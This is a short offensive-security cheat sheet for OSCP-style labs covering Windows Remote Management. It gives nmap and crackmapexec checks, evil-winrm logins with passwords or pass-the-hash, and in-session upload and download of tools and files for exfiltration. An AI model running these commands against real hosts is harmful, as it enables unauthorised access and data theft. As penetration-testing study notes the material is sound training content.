# Notes — WinRM (5985 / 5986)

> Authorized lab/OSCP use only.

## What it is
Windows Remote Management. 5985 = HTTP, 5986 = HTTPS. With valid credentials (or an NTLM hash) it gives a full remote PowerShell session — the standard Windows foothold *after* you've found creds.

## Check reachable
```bash
nmap -sV -p5985,5986 $IP
crackmapexec winrm $IP -u user -p pass        # (Pwn3d!) = works
```

## Connect
```bash
evil-winrm -i $IP -u user -p pass
evil-winrm -i $IP -u user -H <NTLM-hash>      # pass-the-hash
evil-winrm -i $IP -u user -p pass -S          # HTTPS (5986)
```

## Inside the session
```powershell
whoami /all
upload /path/local.exe C:\Temp\local.exe      # evil-winrm built-ins
download C:\Users\user\Desktop\user.txt
# load scripts
Invoke-Command, Get-ChildItem, type <file>
```

Evil-WinRM `-s` loads a local scripts dir for PS tooling; `menu` lists helpers.

## Requirements
- Valid credentials or NTLM hash.
- User must be in **Remote Management Users** or local admins.

## Common Mistakes
- Trying WinRM without creds — it's auth-required, not a pre-auth exploit.
- Forgetting `-S` for 5986.
- Not testing PtH with a recovered hash.

## OSCP Tips
- First thing to try once you recover any Windows credential/hash.
- `upload`/`download` make transferring winPEAS and exfil trivial.
- Pair with BloodHound to confirm the account can actually WinRM in.
